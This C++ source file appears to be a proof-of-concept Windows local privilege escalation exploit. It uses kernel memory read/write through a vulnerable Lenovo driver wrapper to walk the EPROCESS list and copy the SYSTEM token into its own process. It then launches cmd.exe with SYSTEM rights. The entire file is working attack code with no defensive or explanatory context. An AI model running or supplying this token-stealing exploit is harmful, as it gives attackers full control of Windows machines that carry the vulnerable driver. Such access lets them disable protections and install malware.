#include <Windows.h>
#include <stdio.h>
#include "LenovoMemoryMgr.h"

BOOL SearchEprocessLinksForPid(LenovoMemoryMgr lm, UINT64 Pid, UINT64 SystemEprocess, PUINT64 lpTargetProcess) {
	BOOL bRes = FALSE;
	if (!lpTargetProcess) {
		return FALSE;
	}

	UINT64 ListIter = SystemEprocess + OFFSET_EPROCESS_LINKS;
	UINT64 ListHead = ListIter;
	while (TRUE) {
		bRes = lm.ReadVirtData((ListIter + 0x8), &ListIter);
		
		if (!bRes) {
			return FALSE;
		}

		if (ListIter == ListHead) {
			puts("Process not found in ActiveProcess links!");
			return FALSE;
		}

		UINT64 IterEprocessBase = ListIter - OFFSET_EPROCESS_LINKS;
		UINT64 IterPid = 0;

		bRes = lm.ReadVirtData((IterEprocessBase + OFFSET_EPROCESS_PID), &IterPid);
		if (!bRes) {
			return FALSE;
		}

		printf("Found EPROCESS : %llx - PID %llx\n", IterEprocessBase, IterPid);
		if (IterPid == Pid) {
			puts("Found target EPROCESS!");
			*lpTargetProcess = IterEprocessBase;
			return TRUE;
		}
	}
}

UINT64 GetPsInitialSystemProc(UINT64 lpNtoskrnlBase) {
	HMODULE hNtos = LoadLibraryA("ntoskrnl.exe");
	if (!hNtos) {
		return NULL;
	}

	PVOID initial_proc = GetProcAddress(hNtos, "PsInitialSystemProcess");
	initial_proc = (PVOID)(((SIZE_T)initial_proc - (SIZE_T)hNtos) + (SIZE_T)lpNtoskrnlBase);
	FreeLibrary(hNtos);
	return (UINT64)initial_proc;
}


int main() {
	LenovoMemoryMgr lm = LenovoMemoryMgr::LenovoMemoryMgr();
	
	BOOL hasInit = lm.init();
	
	if (!hasInit) {
		return -1;
	}

	UINT64 OurProcess = 0;
	UINT64 PsInitialSystemProcPtr = GetPsInitialSystemProc(lm.NtosBase);
	printf("Found initial system process at %llx\n", PsInitialSystemProcPtr);
	UINT64 SystemProc = 0;
	lm.ReadVirtData(PsInitialSystemProcPtr, &SystemProc);
	SearchEprocessLinksForPid(lm, GetCurrentProcessId(), SystemProc, &OurProcess);
	UINT64 SystemToken = 0;
	lm.ReadVirtData(SystemProc + OFFSET_EPROCESS_TOKEN, &SystemToken);
	lm.WriteVirtData(OurProcess + OFFSET_EPROCESS_TOKEN, &SystemToken);
	lm.teardown();
	system("cmd.exe");
	return 0;
}